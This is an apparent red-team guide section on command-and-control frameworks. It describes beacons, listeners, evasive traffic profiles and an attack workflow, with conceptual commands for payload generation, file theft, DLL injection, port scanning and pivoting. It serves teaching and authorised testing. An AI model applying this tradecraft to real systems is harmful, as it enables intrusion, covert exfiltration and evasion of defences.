## Command and Control (C2) Frameworks (Conceptual)

Command and Control (C2) frameworks are essential for red team operations, providing a centralized platform to manage compromised systems, execute commands, and exfiltrate data covertly. While specific commands and features vary between frameworks, the underlying concepts remain similar. This section will cover conceptual usage, drawing examples from popular frameworks like Cobalt Strike and Mythic.

### Core C2 Concepts

*   **Beacon/Agent:** The payload deployed on the compromised host that communicates back to the C2 server.
*   **Listener:** A component on the C2 server that waits for incoming connections from beacons/agents.
*   **C2 Profile/Malleable C2:** Configuration files that define how the beacon communicates (e.g., HTTP, HTTPS, DNS, SMB), allowing for custom traffic patterns to evade detection.
*   **Staging:** The process of delivering the full payload to the compromised host in stages, often to reduce the initial payload size and evade detection.
*   **Tasks:** Commands or actions sent from the C2 server to the beacon/agent for execution.
*   **Pivoting:** Using a compromised host as a jump point to access other systems within the internal network.

### General Workflow

1.  **Set up Listener:** Configure the C2 server to listen for incoming connections on a specific port and protocol.
    *   *Example (Conceptual):*
        ```
        listener add --name http_beacon --port 80 --profile /path/to/http_profile.profile
        ```

2.  **Generate Payload:** Create a beacon/agent payload that connects back to the configured listener. This payload can be an executable, DLL, PowerShell script, etc.
    *   *Example (Conceptual):*
        ```
        payload generate --listener http_beacon --format exe --output /tmp/beacon.exe
        ```

3.  **Deliver Payload:** Get the generated payload onto the target system (e.g., via phishing, exploiting a vulnerability, or physical access).

4.  **Gain Session/Beacon:** Once the payload executes, it establishes a connection back to the C2 server, and a new session/beacon appears in the C2 framework.

5.  **Interact with Session:** Begin issuing commands and performing post-exploitation activities through the C2 framework.
    *   *Example (Conceptual - Common Commands):*
        ```
        # List active sessions
        sessions

        # Interact with a specific session (e.g., session ID 1)
        interact 1

        # Execute a shell command
        shell whoami
        shell ipconfig /all

        # Upload a file
        upload /local/path/tool.exe C:\Windows\Temp\tool.exe

        # Download a file
        download C:\Users\Public\Documents\sensitive.zip /local/path/

        # List processes
        ps

        # Migrate to another process
        migrate <pid>

        # Take a screenshot
        screenshot

        # Inject a DLL into a process
        inject <pid> /path/to/malicious.dll

        # Perform internal network scanning (via beacon)
        portscan 192.168.1.0/24 445,3389

        # Pivoting (e.g., SOCKS proxy through beacon)
        socks 1080
        ```

### Key Features of C2 Frameworks

*   **Evasion:** Techniques to bypass antivirus, EDR, and network detection systems (e.g., custom C2 profiles, obfuscation, process injection).
*   **Tasking:** Ability to queue commands for beacons that are not currently connected.
*   **Data Staging/Exfiltration:** Securely transfer data in and out of the target network.
*   **Pivoting/Tunneling:** Create network tunnels through compromised hosts to access internal network segments.
*   **Modularity:** Support for custom modules and scripts to extend functionality.
*   **Reporting:** Generate detailed logs and reports of the engagement.

Understanding the conceptual operation of C2 frameworks is crucial for effective red teaming, regardless of the specific tool used. Operators should always prioritize stealth and adaptability in their C2 infrastructure.

